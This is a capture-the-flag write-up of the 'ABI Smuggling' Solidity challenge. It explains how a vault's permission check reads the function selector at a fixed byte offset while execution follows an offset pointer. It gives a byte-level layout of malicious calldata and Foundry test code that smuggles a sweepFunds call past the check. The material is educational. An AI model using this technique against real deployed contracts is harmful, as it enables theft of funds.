# 15. ABI Smuggling

The `execute()` function checks permissions by reading the selector at a **fixed position** (byte 100), but the actual call uses an **offset pointer** to locate the data. This mismatch allows smuggling unauthorized function calls.

## **The Attack**

We craft `calldata` where the permission check sees the allowed `withdraw` selector, but the actual execution calls the unauthorized `sweepFunds` function.

## **Malicious Calldata Structure**

1. **Bytes 0-3**: execute selector (`0x1cff79cd`)
2. **Bytes 4-35**: Target address (vault address, padded to 32 bytes)
3. **Bytes 36-67**: Offset pointer = 100 (**KEY**: tells decoder data starts at position 4+100=104)
4. **Bytes 68-99**: 32 empty bytes (padding)
5. **Bytes 100-103**: withdraw selector (`0xd9caed12`) - **decoy for permission check** ✅
6. **Bytes 104-135**: Length of the actual function data (32 bytes)
7. **Bytes 136+**: `sweepFunds` calldata (starting with `0x85fb709d`) - **actually executed** 💀

## **The Exploit**

- **Permission check** reads position 100 → finds withdraw selector → ✅ PASS
- **Actual execution** reads from offset 104 → finds length → reads data from 136 → executes `sweepFunds`

## Resources:

https://rareskills.io/post/abi-encoding

## Solution:

```solidity
 function test_abiSmuggling() public checkSolvedByPlayer {
        bytes32 vaultAddress = bytes32(uint256(uint160(address(vault))));
        bytes4 executeSelector = vault.execute.selector;
        bytes4 withdrawSelector = vault.withdraw.selector;
        bytes memory sweepFundsData = abi.encodeCall(vault.sweepFunds, (recovery, IERC20(address(token))));
        bytes32 sweepFundsDataLength = bytes32(sweepFundsData.length);
        bytes32 sweepFundsDataOffset = bytes32(uint256(100));
        bytes memory executeCallData = abi.encodePacked(
            executeSelector,
            vaultAddress,
            sweepFundsDataOffset,
            bytes32(uint256(0)),
            withdrawSelector,
            sweepFundsDataLength,
            sweepFundsData
        );

        (bool success,) = address(vault).call(executeCallData);
        assertTrue(success);
    }
```
